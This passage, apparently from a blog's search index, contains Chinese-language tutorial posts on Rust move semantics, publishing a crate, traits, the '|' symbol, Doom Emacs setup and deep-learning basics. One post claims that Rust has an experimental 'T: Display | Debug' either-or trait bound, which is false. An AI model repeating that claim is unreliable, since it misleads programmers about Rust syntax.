的『移动构造函数』的实现很相似，区别在于：\nC++ 在浅拷贝之后，需要将原始对象的字段重置，以防止析构函数多次释放资源。 Rust 则直接通过编译器保证原始对象不再可用，在安全性上更胜一筹。 当然，如前所述，整个过程 Rust 是自动完成的，而 C++ 需要由程序员来手工完成。\n总结 综上所述，Rust 的 move 和 C++ 的 move 在设计理念、实现机制和使用场景方面都存在较大差异，但两者在资源转移方面又有一些相似之处，例如都可以通过浅拷贝来完成资源的高效转移。通过这种对比分析，我们可以更进一步理解 move 这个概念。\n这点可以通过生成 Rust 源码的 LLVM IR 来验证（命令： cargo rustc -- --emit=llvm-ir ），例如这个案例。 ↩︎\n","description":"\n","tags":["rust"],"title":"\nRust 的 move 和 C++ 的 std::move","uri":"/posts/move-in-rust-and-cpp/"},{"categories":null,"content":"今天发布了我的第一个 crate: django-auth, 虽然是一个非常简单的 crate, 但麻雀虽小，五脏俱全，API 文档、测试用例、doc test 等一个都不能少 😎。\n先简单介绍一下这个库，然后再介绍一下在 crates.io 上发布 crate 的流程。\ndjango-auth Django 是一个 Python 的 web framework, 若干年前用曾经 Django 写过一些 Web 应用。最近刚好在学习 Rust, 因此计划用 Rust 将其中一个应用重写一遍练练手。\n首先遇到的第一个问题，便是账号鉴权的问题：\n旧的应用使用的是 Django 的 auth 体系，数据库中保存的密码 hash 值由 Django 框架自动生成； 如果不希望让所有用户重置密码（这样做会导致所有用户的旧密码失效），就需要在新写的 Rust 应用中兼容 Django 的 auth 体系； 要想兼容 Django 的 auth 体系，就需要将 Django 生成的 auth 数据库表迁移出来，并且能够利用这些数据来验证用户密码。 经过上面这么一番分析，相信你应该知道这个 crate 是干什么的了。主要就两个功能：\n验证用户输入的密码是否正确，对应 API： django_auth 为新用户（或者当用户修改密码时），生成 Django 风格的 hashed password, 对应 API: django_encode_password 🌟 如果对 Django 的密码存储格式感兴趣，可以参考这个文档：Password management in Django 。\n除了可以作为 lib 使用外，还附赠了一个 cli 工具，用来验证密码、对密码进行编码：\n$ cargo run --example auth:\n1 2 3 4 5 6 7 8 9 10 11 12 Authenticate or generate Django-managed passwords Usage: auth \u003cCOMMAND\u003e Commands: encode Encode a password in Django-style verify Verify a Django stored hashed password help Print this message or the help of the given subcommand(s) Options: -h, --help Print help -V, --version Print version 🚀 就这么简单！\nCrate 发布流程 创建 crate.io 账号\n打开网站 crate.io，点击右上角登录 crate.io。需要注意两点：\n目前只支持 github 账号登录。 用于登录的 github 账号似乎要先拥有一个 Organization（我因为之前已经有 Organization，所以不确定没有行不行）。 获取 API token\n打开 API Token 页面，按照指示生成一个 API token, 复制 token, 然后到命令行运行：\n1 cargo login 按照提示将 token 粘贴并回车即可。\n验证邮箱\n发布 crate 前需要先验证邮箱，否则会发布失败。打开 profile 页，按照指示填入邮箱并验证即可。\n填写 package 信息\n发布前需要在 Cargo.toml 文件中的 package 段中填写如下信息：\nlicense or license-file: 版权信息。 description: 库的一句话介绍。 homepage: 主页。 documentation: 文档链接（可选，不填则会自动使用该 crate 对应的 docs.rs 文档链接）。 repository: 代码仓库。 readme: readme 文件名（可选，如果有 README.md 文件，会自动使用）。 更详细的信息可以参考 官方的 Crate 发布指南，也可以参考 django-auth 的 Cargo.toml 。\n发布 Crate\npackage 信息确认后，可以在你的 crate 项目根目录，先运行如下命令检查一下发布流程：\n1 cargo publish --dry-run 该命令不会真正执行发布操作，但是会把提交到 crate.io 之前要做的事情都做一遍。\n另外，可以执行如下命令，检查发布时将会打包上传的所有文件（注意检查是否包含一些可能泄漏私人信息的文件）：\n1 cargo package --list ⚠️ `cargo publish` 命令会将当前目录下所有的 version controlled 文件 (即所有由版本管理器管理的文件) 都打包并上传。如果你有一些带有敏感信息的文件，例如密码、 token 等私人配置文件，请一定记得从版本管理器中忽略掉这些敏感文件（使用 git 的话可以在 `.gitignore` 中配置）。\n如果有些文件比较大，或者觉得没必要上传到 https://crates.io/ （例如一些测试数据等），但确实需要进行版本管理的，可以在 `Cargo.toml` 文件中配置，例如：\n1 2 3 4 [package] exclude = [ \"testdata/*\", ] 该配置会忽略掉 `testdata` 目录下所有文件。\n确认无误后，可以运行如下命令，真正将 crate 发布至 crate.io:\n1 cargo publish ✅ 搞定！\n","description":"\n","tags":["rust","django"],"title":"\n发布我的第一个 Crate: django-auth","uri":"/posts/publish-crate-django-auth/"},{"categories":null,"content":"Trait 初探 trait 是 Rust 中用来定义共享行为的抽象机制，和 Java 的 interface, Swift 的 protocol 等接口抽象机制有点类似。\n定义一个 trait 很简单：\n1 2 3 trait Callable { fn call(\u0026self); } 为 Rust 的 str 类型实现该 trait (impl​ements Callable for str):\n1 2 3 4 5 6 7 impl Callable for str { fn call(\u0026self) { println!(\"call on {self}\"); } } \"job-1\".call(); 1 call on job-1 上面的代码为基本类型 str 扩展了一个 call 方法，语法上还是挺简洁、直观的。\n这种为现有类型扩展 trait 实现的能力，除了可以应用在 Rust 的基本类型上，也可以应用在标准库、外部第三方库以及自定义的各种类型上，前提只要不违反 孤儿规则 (Orphan Rule) 即可。\nJava 不支持这种能力，Kotlin 通过 extension function 可以为现有类型扩展新方法（仅限于增加方法，不支持增加新的 interface 实现），而 Swift 是支持的。\n当然，trait 的能力远不止于此，远比 interface/protocol 强大和复杂得多。下面我们来逐一探析 trait 的这些强大功能。\nTrait 的基本用法 Rust 中的操作符定义 前面介绍了如何为外部类型扩展方法，当然也可以反过来，为自定义类型实现标准库中定义的 trait, 或者实现外部库中定义的 trait。\n为自定义类型 Offset 扩展操作符 + 的实现（附带 += ​​实现）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 use std::ops::AddAssign; #[derive(Debug, Copy, Clone, PartialEq)] struct Offset { x: i32, y: i32, } impl AddAssign\u003ci32\u003e for Offset { fn add_assign(\u0026mut self, v: i32) { *self = Self { x: self.x + v, y: self.y + v, }; } } let mut offset = Offset { x: 1, y: 0 }; offset += 2; assert_eq!(offset, Offset { x: 3, y: 2 }); 🌟 Tips\n上述代码说明了一个事实，即 Rust 中的操作符也是通过 trait 来定义的。因此，我们可以轻松通过实现 trait 来为自定义类型增加操作符的支持。用法也是标准的 trait 用法，并没有引入新的『操作符重载』的概念。\nTrait 中的默认实现 和 Java 类似（Java 8 引入该特性），trait 在定义时可以提供方法的默认实现：\n1 2 3 4 5 6 7 pub trait Summary { fn summarize_author(\u0026self) -\u003e String; fn summarize(\u0026self) -\u003e String { format!(\"(Read more from {}...)\", self.summarize_author()) } } 默认实现广泛存在于 Rust 标准库提供的 trait 中，为开发过程提供了很大的便利，并规范了一些编程的惯用法 (idioms)。\n特征约束 (Trait Bound) Trait 可以和泛型编程很好的结合使用，可用于为泛型类型提供特征约束：\n1 2 3 pub fn notify(item: \u0026impl Summary) { println!(\"Breaking news! {}\", item.summarize()); } impl Trait 实际上是 trait bound 的语法糖，上述代码和下面的代码等价：\n1 2 3 fn notify\u003cT: Summary\u003e(item: \u0026T) { println!(\"Breaking news! {}\", item.summarize()); } 多重特征约束 通过 + 操作符支持多重特征约束：\n1 2 pub fn notify(item: \u0026(impl Summary + Display)) { } 等价于：\n1 2 pub fn notify\u003cT: Summary + Display\u003e(item: \u0026T) { } 在 where 子句中定义 Trait Bound 在泛型参数和约束较多时，这种方式相对会更加清晰一些：\n1 2 3 4 5 fn some_function\u003cT, U\u003e(t: \u0026T, u: \u0026U) -\u003e i32 where T: Display + Clone, U: Clone + Debug, {} 使用特征约束有条件地实现方法 (Conditional APIs) 这个功能很有意思，可以为泛型的特定类型（实现了某些 trait 的类型）增加额外的方法定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 use std::fmt::Display; struct Pair\u003cT\u003e { x: T, y: T, } impl\u003cT\u003e Pair\u003cT\u003e { fn new(x: T, y: T) -\u003e Self { Self { x, y } } } impl\u003cT: Display + PartialOrd\u003e Pair\u003cT\u003e { // 该方法仅在 T 实现了 Display + PartialOrd 时可用。 fn cmp_display(\u0026self) { if self.x \u003e= self.y { println!(\"The largest member is x = {}\", self.x); } else { println!(\"The largest member is y = {}\", self.y); } } } 一揽子实现 (Blanket Implementations) 这个功能很强大，在标准库中广泛使用，例如：\n1 2 3 4 // 为实现了 Display trait 的任意类型实现 ToString trait impl\u003cT: Display\u003e ToString for T { // --snip-- } 也就是说，一个类型只要实现了 Display trait, 便自动实现了 ToString trait（免费获得该接口）, 可以对其调用 to_string 方法（该方法由 ToString trait 定义）。因此，如果一个类型需要支持转换成 String, 我们一般实现 Display trait 即可。\nBlanket implementations 也需要遵守孤儿规则 (Orphan Rule)，而且情况会更加复杂一些。请参考下面这个错误示范：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 struct Position { pub x: usize, pub y: usize, } enum Offset { Forward(usize), Backward(usize), } pub trait Document { // 获取一些文档的上下文信息 // ... } // 尝试为实现了 Document trait 的任意类型实现 AddAssign trait // 编译失败❗ impl\u003cT: Document\u003e std::ops::AddAssign\u003cOffset\u003e for T { fn add_assign(\u0026mut self, rhs: Offset) { } } 上述案例中， AddAssign 是标准库中定义的 trait, 属于外部类型，而 T 是一个泛型类型，意味着 T 可以是任意实现了 Document trait 的类型（包括定义在其他 crate 中的外部类型），因此，违反了孤儿规则的定义。\n返回实现了特定 Trait 的类型 在返回类型中指定 trait 类型，可以对返回类型进行约束：\n1 2 3 4 5 6 7 8 9 10 fn returns_summarizable() -\u003e impl Summary { Tweet { username: String::from(\"horse_ebooks\"), content: String::from( \"of course, as you probably already know, people\", ), reply: false, retweet: false, } } 由于泛型类型是编译时确定的，因此上述这种方式有个限制，就是不能在函数中的分支代码里，分别返回不同的具体类型。\n如果需要支持返回多个不同的实现了某个 trait 的具体类型，需要使用 trait object (Box\u003cdyn Trait\u003e 或 \u0026dyn Trait, 参考 Using Trait Objects That Allow for Values of Different Types)。\n孤儿规则 (Orphan Rule) 为类型实现 trait 有一个限制：该类型和要实现的 trait 至少要有一个是在当前 crate 中定义的（crate 是 Rust 中的最小编译单元，参考 Packages and Crates）。\n该限制是一致性 (coherence) 属性的一部分，叫做孤儿规则 (orphan rule)。该规则确保其他人的代码不会破坏你的代码，反之亦然。\n例如，你无法为标准库中的 IpAddr 类型增加 Iterator trait 的实现（因为这二者都定义在外部 crate 中）：\n1 2 3 4 5 6 7 8 9 10 use std::net::IpAddr; // 编译失败❗ impl Iterator for IpAddr { type Item = u8; fn next(\u0026mut self) -\u003e Option\u003cSelf::Item\u003e { return None } } 编译器报告的错误如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 error[E0117]: only traits defined in the current crate can be implemented for types defined outside of the crate --\u003e src/main.rs:5:1 | 5 | impl Iterator for IpAddr { | ^^^^^^^^^^^^^^^^^^------ | | | | | `IpAddr` is not defined in the current crate | impl doesn't use only types from inside the current crate | = note: define and implement a trait or new type instead For more information about this error, try `rustc --explain E0117`. error: could not compile `cargo0Pk8IQ` (bin \"cargo0Pk8IQ\") due to previous error 错误信息十分详尽，不仅解释了错误原因、指出了错误位置，还提供了解决方案和相关文档说明。\n静态分派 \u0026 动态分派 (Static dispatch \u0026 Dynamic dispatch) Trait 支持两种分派方式，一种是静态的，即在编译期确定的分派方式；第二种是动态的，即在运行时确定如何分派。\n静态派发的特点 上面提到 trait 在泛型中的用法，都是编译期确定的，因此都属于静态派发。这种派发方式的特点如下：\n编译期确定，没有运行时开销，无性能损失，即所谓的“零成本抽象” (Zero-cost Abstraction)。\n针对每个具体类型，都会在编译期产生一个“副本”，这会在一定程度增加二进制文件尺寸，有点“以空间换时间”的意思。\n当然，即使不使用 trait + 泛型特性，自己手写代码也并不会比这个更小，这就是 Stroustrup 所说的 “What you do use, you couldn’t hand code any better” 的意思。\n支持函数调用的内联优化 (inline)。\n动态派发的动机、用法 当涉及 trait object (\u0026dyn Trait 或 Box\u003cdyn Trait\u003e, 其中 Trait 表示某个 trait）时，就会出现动态分派。\n动态派发的动机主要是希望实现面向对象语言中的多态功能，类似 C++ 的虚函数。\n例如，假设我们要实现一个任务队列，队列中的任务希望足够抽象和通用，因此希望通过一个 trait 来进行约束，类似这样：\n1 2 3 4 5 6 7 trait Task { fn do_job(\u0026self); } struct TaskQueue { tasks: Vec\u003cBox\u003cdyn Task\u003e\u003e, } 上述案例中，我们无法在编译期确定 Vec 中存储的具体类型，因此，静态分派显然已经无法满足我们的需求，只能使用 Box\u003cdyn Task\u003e 这类对象，从而引入动态分派。\n有了这个定义，我们可以用一种统一的方式，对 tasks 中的任务进行操作，而无需关心 task 的具体类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 impl TaskQueue { fn new() -\u003e TaskQueue { TaskQueue { tasks: Vec::new(), } } fn add(\u0026mut self, t: Box\u003cdyn Task\u003e) { self.tasks.push(t) } fn process(\u0026self) { self.tasks.iter().for_each(|t| t.do_job()); } } impl Task for \u0026str { fn do_job(\u0026self) { println!(\"do job: {self}\"); } } impl Task for i32 { fn do_job(\u0026self) { println!(\"do job: {self}\"); } } let mut q = TaskQueue::new(); q.add(Box::new(\"task 1\")); q.add(Box::new(2)); q.process(); 1 2 do job: task 1 do job: 2 动态派发的实现原理和特点 trait 的动态派发的实现也和 C++ 的虚函数类似，借用了虚函数表 (vtable) 来进行动态派发：\ntrait object 存储了指向实现了该 trait 的类型实例的指针 trait object 存储了在该类型上查找 trait 方法的表（虚函数表） 有了以上两个信息，trait object 就可以在运行时确定具体应该调用哪个函数了。\n了解了动态派发的实现原理，其特点也很明显了：\n有额外的运行时开销（查表开销） 不会造成编译膨胀 不支持函数调用的内联优化 (inline) Trait 的对两种派发方式的支持，也体现了 pay as you go 的设计原则：当你需要更高级的抽象能力时，你可以使用动态派发；当你不需要时，trait 的抽象会在编译期被还原成具体类型，无需付出任何额外的代价。\n可派生的 Trait (Derivable Traits) Derivable trait 指可以通过编译器自动实现的 trait。对于某些标准库中定义的 trait， Rust 允许你在自定义类型上通过简单地添加一个属性（attribute）来自动实现这些 trait，而不需要手动编写实现代码。这个过程被称为 “派生”（deriving）。\n使用可派生 trait 的主要优点是它减少了样板代码的数量，使得类型定义更加简洁。这对于提高代码的可读性和可维护性非常有帮助。\n除了标准库提供的 derivable traits 外，第三方库也可以为自己的 traits 实现 derive, 因此，这个 derivable traits 列表是开放的。\n下面列出了目前为止标准库提供的所有 derivable traits, 并对其使用要点进行简单说明。\nDebug 用于支持字符串格式化中的 {:?} 占位符，主要用于 debug 打印。\n特殊应用场景：\nassert_eq! 宏要求其参数实现 Debug trait。 用法演示：\n1 2 3 4 5 6 7 8 #[derive(Debug)] // 自动派生 Debug trait 的实现 struct Position { x: u32, y: u32, } let p = Position{ x: 10, y: 20 }; println!(\"{:?}\", p); 1 Position { x: 10, y: 20 } 上面是程序的输出结果。\nPartialEq, Eq 用于支持 == 和 != 操作符。 Eq 没有方法定义，只是一个指示，表明针对该类型的每个值，该值都等于其自身。 Eq trait 只能应用于实现了 PartialEq 的类型。 特殊应用场景：\nassert_eq! 宏要求其参数实现 PartialEq trait。 HashMap\u003cK, V\u003e 要求 key 值实现 Eq trait。 用法演示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #[derive(PartialEq, Eq, Debug)] struct Rect { left: u32, right: u32, top: u32, bottom: u32, } let r1 = Rect { left: 0, right: 10, top: 0, bottom: 10, }; let r2 = Rect { left: 0, right: 10, top: 0, bottom: 10, }; dbg!(r1 == r2); 1 [src/main.rs:25] r1 == r2 = true PartialOrd, Ord PartialOrd 和 Ord 用于支持类型的比较操作，可用于 \u003c, \u003e, \u003c=, \u003e= 这几个操作符。二者之间有如下区别：\nPartialOrd 只能应用在实现了 PartialEq 的类型上 Ord 只能应用在实现了 Eq (从而也需要实现 PartialEq ) 的类型上 PartialOrd 返回的是 Option\u003cOrdering\u003e 类型，而 Ord 返回的是 Ordering 类型 PartialOrd 支持的可比较性是可选的 比较有意思的是， PartialOrd 中定义的比较方法返回的是一个 Option\u003cOrdering\u003e 类型，也就是说，可以表达某些值之间不可比较的语意。\n为了演示这个概念，下面杜撰了一个例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #[derive(PartialEq)] // 自动派生 PartialEq trait 的实现 enum E { Man(u16), Dog(u16), } use E::{Dog, Man}; impl PartialOrd for E { fn partial_cmp(\u0026self, other: \u0026Self) -\u003e Option\u003cstd::cmp::Ordering\u003e { return if let (Dog(me), Dog(other)) = (self, other) { // Dog 只和 Dog 相比较 me.partial_cmp(other) } else if let (Man(me), Man(other)) = (self, other) { // Man 只和 Man 相比较 me.partial_cmp(other) } else { // 其他情况不支持比较操作，比较时会直接返回 false None } } } let (man1, man2) = (Man(20), Man(30)); let (dog1, dog2) = (Dog(2), Dog(3)); dbg!(man2 \u003e man1); dbg!(dog2 \u003e dog1); dbg!(man1 \u003e dog1); dbg!(man1.partial_cmp(\u0026dog1)); 1 2 3 4 [src/main.rs:29] man2 \u003e man1 = true [src/main.rs:30] dog2 \u003e dog1 = true [src/main.rs:31] man1 \u003e dog1 = false [src/main.rs:32] man1.partial_cmp(\u0026dog1) = None 上面的输出说明：\nMan 之间是可以进行比较的 Man 和 Dog 之间不可比，如果进行比较只会返回 false 或者 None, 取决于使用的是运算符还是方法调用。 总结一下，两个值之间的比较，遵循如下规则：\n当且仅当 partial_cmp(a, b) = Some(Equal)= 时， a == b 当且仅当 partial_cmp(a, b) = Some(Less)= 时， a \u003c b 当且仅当 partial_cmp(a, b) = Some(Greater)= 时， a \u003e b 当且仅当 a \u003c b || a ​=​= b= 时， a \u003c= b 当且仅当 a \u003e b || a ​=​= b= 时， a \u003e= b 当且仅当 !(a ​=​= b)= 时， a != b Ord 意味着任意两个值之间都存在有效的顺序 Ord 的用法和 PartialOrd 类似，只不过返回的直接就是一个 Ordering, 而非 Option\u003cOrdering\u003e, 这里不再举例说明。\n特殊应用场景：\nBTreeSet\u003cT\u003e 需要其存储的值实现 Ord trait。 Clone, Copy Clone 可用于实现值的深拷贝 (deep copy), 过程可能涉及对堆数据的拷贝。 实现 Copy trait 的类型​必须同时实现 Clone trait 。它们执行的是同样的任务，只是实现 Copy trait 意味着： 拷贝过程成本低，速度快（语意层面）。 赋值或传参时无需显式调用 clone 方法（语法层面）。 一个结构如果要 derive Copy trait, 要求其字段都必须实现了 Copy trait。 特殊应用场景：\n调用 slice 的 to_vec 方法要求其存储的值实现 Clone trait。 在“Trait + 所有权”中我们会再次提到 Copy trait。\nHash 主要在哈希表中应用, HashMap\u003cK, V\u003e 要求 key 值实现 Hash trait。\nDefault Default trait 允许以一种惯用的方式创建类型的默认值。\n特殊应用场景：\n在结构体更新语法中使用： ..Default::default() Option\u003cT\u003e.unwrap_or_default 方法要求 T 类型实现 Default trait 下面演示了如何在结构体更新语法中使用 Default trait 提供的能力：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 通过 derive 指令自动获得 Debug, Clone 和 Default trait #[derive(Debug, Clone, Default)] struct Rect { left: u32, right: u32, top: u32, bottom: u32, } let r1 = Rect { right: 10, bottom: 10, ..Default::default() }; dbg!(r1); 1 2 3 4 5 6 [src/main.rs:18] r1 = Rect { left: 0, right: 10, top: 0, bottom: 10, } Trait+ 系列 这个章节介绍了一系列 Rust 中利用 trait 实现的通用能力或惯用法，这些内容也是 Rust 编程中较常见的概念、方法和技巧，实用性很强，我称之为“Trait+ 系列”。\n考虑到篇幅太长，本章节单独整理成文，请参阅： Rust Trait+ 系列 。\n总结 上面整理了一大堆 trait 相关的功能，看起来很复杂，实际上其底层却是一个统一、通用的概念。只需掌握 trait 这一套概念和用法，就可以类推到各个方面：\n为外部类型扩展方法 实现“操作符重载” 泛型中的特征约束 面向对象的“多态” 类型转换 闭包 所有权 解引用 迭代器 错误处理 并发 …… 这种在底层概念和能力上的统一和复用，值得我们学习和借鉴。\n参考资料 Traits: Defining Shared Behavior Trait objects Abstraction without overhead: traits in Rust Derivable Traits Treating Smart Pointers Like Regular References with the Deref Trait ","description":"\n","tags":["rust"],"title":"\nRust 中的特征 (Trait)","uri":"/posts/traits-in-rust/"},{"categories":null,"content":"Rust 中的 | 用途比较多，这里做一个简单的整理。\n模式匹配中的“或”模式 (Pattern Alternatives) 在模式匹配（如 match 语句或 if let 表达式）中， | 可以用来表示多个模式的组合：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 fn process_keypress(\u0026mut self) -\u003e Result\u003c(), std::io::Error\u003e { let pressed_key = read_key()?; if let Key::Ctrl('q') | Key::Ctrl('x') = pressed_key { self.should_quit = true; } // 和下面这句等价： match pressed_key { Key::Ctrl('q') | Key::Ctrl('x') =\u003e self.should_quit = true, _ =\u003e (), } // ... Ok(()) } 闭包参数 在 Rust 的闭包中， 我们在两个 | 之间定义闭包的参数：\n1 2 let add_one = |x| x + 1; let result = add_one(5); 参数可以有多个，也可以留空。\n严格意义来说，在闭包中的用法不是操作符，应该算是 Rust 语法的一部分。\n位或 (Bitwise OR) 操作 这个比较简单，和其他语言中一致：\n1 2 3 let a = 0b1010; let b = 0b1100; let c = a | b; 逻辑或 || 操作符 这个也跟其他语言一样，用于连接两个布尔表达式：\n1 2 3 4 5 6 7 8 let a = true; let b = false; if a || b { println!(\"至少一个条件为真\"); } else { println!(\"两个条件都为假\"); } 类型约束中的“或”约束 在使用泛型和 trait 时， | 可以用于指定类型必须实现多个 trait 中的任意一个（目前这个用法还在实验阶段，需要在 Cargo.toml 中启用特定的特性）：\n1 2 3 fn do_something\u003cT: Display | Debug\u003e(value: T) { // ... } 在这个例子中， T 类型参数必须实现 Display 或 Debug trait 中的至少一个。\n","description":"\n","tags":["rust"],"title":"\nRust 中的 | (竖线) 符号","uri":"/posts/rust-vertical-line/"},{"categories":null,"content":"安装 1 2 git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.config/emacs ~/.config/emacs/bin/doom install 环境变量 执行 doom env 命令，可以 dump 一份当前的 shell 环境变量，Doom 启动时会加载该环境变量。如果你的环境变量配置发生变化（例如修改了 PATH 配置），则应该重新执行一次该命令。\n配置 \u0026 同步 配置主要是修改两个文件：\ninit.el 主要用于配置 Doom 的模块，可以开启、关闭模块，也可以修改模块的一些选项。 packages.el 主要用于安装一些第三方的 Emacs 插件，语法类似于 straight-use-package 。其底层就是通过 straight.el 来实现的。 ‼️ 上述两个文件修改之和，都需要执行 doom sync 命令，并重启 Emacs 才能生效。\n升级 升级分两部分：\ndoom 本身及其管理的 pacakges packages.el 里面安装的第三方 pacakges 升级 doom 本身及其管理的 pacakges doom upgrade 升级 doom 及其安装的 pacakges doom build 重新编译所有的 pacakges 然后重启 Emacs 即可。 升级第三方 pacakges 在 Emacs 中执行 M-x straight-pull-all 升级所有的 pacakges 。 或者，执行 M-x straight-pull-package-and-deps 升级指定的 package 及其倚赖。 在命令行中执行 doom build 重新编译所有的 pacakges 。 最后，重启 Emacs 即可。 诊断 执行 doom doctor 命令，可以对系统环境和配置进行诊断。\n参考 GitHub - doomemacs/doomemacs: An Emacs framework for the stubborn martian hacker ","description":"\n","tags":["emacs"],"title":"\nDoom Emacs 的基本用法","uri":"/posts/basic-usage-of-doom-emacs/"},{"categories":null,"content":"深度学习和神经网络 深度学习是一种实现机器学习的技术，而神经网络是实现深度学习的基本结构。\n具体来说：\n神经网络:\n神经网络是一种模仿人脑处理信息方式的计算系统。它由大量的节点（神经元）组成，这些节点通过层次结构相互连接。 神经网络可以是浅层的（少数层），也可以是深层的（多层）。浅层神经网络常用于较简单的模式识别和数据分类任务。 深度学习:\n深度学习是一种机器学习技术，它特别依赖于深层神经网络，即包含多个隐藏层的神经网络。 深层神经网络能够学习和模拟数据中的高度复杂的模式和关系，这使得深度学习在图像识别、自然语言处理和许多其他领域非常有效。 关系:\n所有深度学习模型都是神经网络，但并非所有神经网络都用于深度学习。深度学习特指使用深层神经网络来进行学习和预测的方法。 深度学习的“深度”指的是网络的层数。更多的层使得网络能够捕获更复杂、更抽象的数据特征。 神经网络是构成深度学习的基础，而深度学习则是利用这些神经网络来实现复杂任务的学习方法。通过构建和训练深层神经网络，深度学习模型能够学习从简单到复杂的数据模式，解决各种复杂的实际问题。\n神经网络和模型 神经网络和模型之间的关系可以这样来阐述：\n神经网络:\n神经网络是一个由多层神经元组成的计算结构，用于模拟复杂的函数映射。每层包含若干神经元，每个神经元通过权重和偏差与其他神经元相连。 神经网络的设计（例如，层数、每层的神经元数量、激活函数等）定义了其结构和潜在的计算能力。 模型:\n当我们谈论“模型”时，通常指的是训练好的神经网络，包括其所有参数（权重和偏差）的特定设置。 模型是神经网络训练过程的产物，它捕捉了训练数据中的模式和关系。 训练过程:\n在训练过程中，神经网络通过调整其权重和偏差来学习数据中的模式。 这些调整是通过计算损失函数的梯度并应用优化算法（如梯度下降）来实现的。 训练完成后，网络的权重和偏差被“冻结”，形成了最终的模型。 关系和理解:\n可以将神经网络视为模型的“蓝图”，而训练后的网络则是根据这个蓝图构建的具体实例。 模型是训练过程的结果，它包含了为了最大化性能而调整和优化的参数集合。 综上，神经网络在训练过程中自动更新其权重和参数，而训练完成后，这些优化过的权重和参数值构成了最终的模型。这个模型可以用来做预测或进一步分析。\n神经网络的学习过程 以图片分类问题为例：\n初始状态:\n在训练开始时，神经网络的权重和偏差通常是随机初始化的。这意味着网络对于分类任务“一无所知”，其初始预测是基于这些随机参数。 喂入数据:\n然后，我们向网络喂入带有标签的训练数据。在分类问题中，这通常是一组标记了正确类别的图片。 进行预测:\n对于每张图片，网络根据当前的权重和偏差进行预测，尝试判断图片所属的类别。 在 PyTorch 中，相当于 forward() 或者 model() 所做的事情。 计算损失:\n网络的预测结果会与实际的标签进行比较，使用损失函数来计算预测值和真实值之间的差异。例如，如果使用交叉熵损失函数，在分类问题中，这个函数会衡量网络预测的概率分布与实际标签的概率分布之间的差异。 调整权重和偏差:\n根据损失函数的结果，网络通过梯度下降（或其他优化算法）来调整其权重和偏差。这个调整是为了减少损失，即减少预测值和真实值之间的差异。 这个过程涉及到计算损失函数相对于每个权重和偏差的梯度，然后按这些梯度的反方向来更新参数。 在 PyTorch 中，相当于执行 optimizer.step() 。 迭代和学习:\n这个过程在整个训练集上反复进行，网络逐渐学习并提升其预测的准确性。 随着训练的进行，网络能够更好地理解数据中的模式和特征，从而在面对新的、未见过的数据时也能做出更准确的预测。 综上，这是一个迭代的学习过程，神经网络通过不断调整自身的参数，以最小化损失函数，进而提高对数据的理解和分类的准确性。\n批量学习（Batch Learning） 神经网络在计算损失时通常采用的是分组（批处理）的方式。这种方法被称为批量学习（Batch Learning）。在这种方法中，网络不是对每张图片单独进行预测和计算损失，而是对一组图片（即一个批次）进行预测，然后计算这个批次的总损失。以下是这个过程的关键点：\n批处理（Batching）:\n在训练神经网络时，数据通常被分成小批次（batches）。一个批次包含多张图片，批次的大小（即批大小，Batch Size）可以根据需要和硬件资源进行设置。 批大小是一个重要的超参数，它影响着模型的内存占用、训练速度和收敛性。 预测和损失计算:\n网络对整个批次的所有图片同时进行预测。 然后，损失函数计算每张图片的预测结果与其实际标签之间的差异，并将这些差异合成整个批次的总损失。在分类问题中，如果使用交叉熵损失函数，这意味着对批次中每张图片的预测概率分布与实际标签的概率分布之间的差异进行计算和求和。 梯度计算和参数更新:\n根据这个批次的总损失，计算损失相对于网络参数的梯度。 这些梯度用于更新网络的权重和偏差，以减少未来预测的总损失。 优势:\n批处理可以提高数据处理的效率，特别是在使用 GPU 等硬件加速时。 它还有助于稳定学习过程，因为每次更新是基于多个样本的平均损失，而不是单个样本的损失。 通过批量处理方法，神经网络在每次更新参数之前，都会考虑一组数据的总体表现，而不是单个数据点。这种方法有助于提高训练的效率和稳定性。\n训练数据的顺序 在训练分类模型时，输入数据的随机化（即将不同类别的样本混合）通常是推荐的做法。以下是这种做法的原因：\n避免偏见:\n如果神经网络先训练所有的猫的图片，然后再训练所有的狗的图片，它可能会在训练初期过度适应（即过拟合）猫的特征，从而忽略了狗的特征。这可能导致模型在初始阶段形成偏见，使得后期难以正确学习和识别狗的特征。 提高泛化能力:\n通过随机混合不同类别的图片，模型能够更平衡地学习各个类别的特征。这有助于提高模型的泛化能力，即在未见过的新数据上的表现。 避免过早收敛:\n如果数据是有序的，模型可能会在训练的早期阶段过早地收敛到对当前顺序敏感的解决方案。通过随机化数据，可以促使模型探索更多的可能性，从而找到更具泛化性的解决方案。 实践中的操作:\n在实际操作中，通常会在每个训练周期（epoch）开始前随机打乱数据。这意味着每个批次（batch）中的图片都是随机选择的，包含不同类别的混合。 这种方法有助于确保每个类别在整个训练过程中都被公平地表示。 因此，为了获得最佳的训练效果，推荐将不同标签的图片混合在一起，然后进行随机化处理后输入训练。这有助于确保模型能够更有效地学习区分这两个类别的特征。\n对神经元的理解 神经元在神经网络中可以看作是一个数学函数。以下是神经元的本质以及权重和偏差在其中的作用：\n神经元的本质:\n神经元（或称为节点）基本上是一个接收输入、产生输出的数学函数。 它接收来自前一层神经元的多个输入，这些输入通常是加权和的形式，其中每个输入都被相应的权重所乘。 激活函数:\n神经元的输出不仅仅是其输入的线性组合。输入的加权和通常会通过一个非线性函数，即激活函数，如 Sigmoid、ReLU 或 tanh 等。 这个激活函数使得神经网络能够捕捉和学习复杂的非线性关系。 权重和偏差:\n权重（Weights）决定了输入信号在影响输出时的强度和重要性。每个输入都有一个相应的权重。 偏差（Bias）是加到加权和上的一个常数，它提供了额外的自由度，使得神经元即使在所有输入都是零时也能有非零的输出。 数学表示:\n从数学的角度来看，一个神经元的操作可以表示为 \\(f(w_1x_1+w_2x_2+…+w_nx_n+b)\\) ，其中 \\(w_1,w_2,…,w_n\\) 